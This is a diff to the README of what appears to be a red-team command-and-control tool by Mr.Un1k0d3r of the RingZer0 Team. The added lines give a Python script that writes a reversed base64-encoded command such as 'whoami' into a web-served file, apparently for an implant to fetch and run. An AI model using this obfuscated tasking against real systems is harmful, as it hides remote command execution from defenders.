@@ -80,6 +80,25 @@ $ python -c 'import base64; print base64.b64encode("cmd.exe /c whoami")[::-1]'
 =kWbh9Ga3ByYvASZ4VmLk12Y
 ```
 
+The file creation can also be automated using the following script
+
+```
+import base64
+import sys
+import os
+
+path = sys.argv[1]
+cmd = sys.argv[2]
+
+os.remove(path);
+open(path, "w+").write(base64.b64encode(cmd)[::-1])
+print "Command added"
+```
+
+```
+update.py /var/www/html/callback.html "whoami"
+```
+
 # Credit
 
 Mr.Un1k0d3r RingZer0 Team
